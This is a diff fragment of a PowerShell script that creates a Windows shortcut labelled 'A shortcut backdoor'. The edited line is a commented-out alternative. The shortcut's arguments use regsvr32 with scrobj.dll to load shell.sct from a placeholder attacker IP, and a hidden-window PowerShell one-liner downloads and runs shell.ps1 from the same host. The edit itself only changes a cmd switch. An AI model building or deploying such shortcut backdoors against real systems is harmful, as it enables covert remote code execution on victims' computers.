@@ -59,7 +59,7 @@ $Shortcut.Arguments = '/c regsvr32 /s /n /u /i:http://<IP>/shell.sct scrobj.dll'
 
 # For conhost.exe and powershell one-liner
 # $Shortcut.TargetPath = 'cmd'
-# $Shortcut.Arguments = "/k `"powershell.exe -nop -NonI -Nologo -w hidden -c `"IEX ((new-object net.webclient).downloadstring(`'http://<IP>/shell.ps1`'))`"`""
+# $Shortcut.Arguments = "/c `"powershell.exe -nop -NonI -Nologo -w hidden -c `"IEX ((new-object net.webclient).downloadstring(`'http://<IP>/shell.ps1`'))`"`""
 $Shortcut.Description = "A shortcut backdoor"
 # $Shortcut.IconLocation = 'C:\path\to\icon.ico'
 $Shortcut.IconLocation = 'shell32.dll,21'
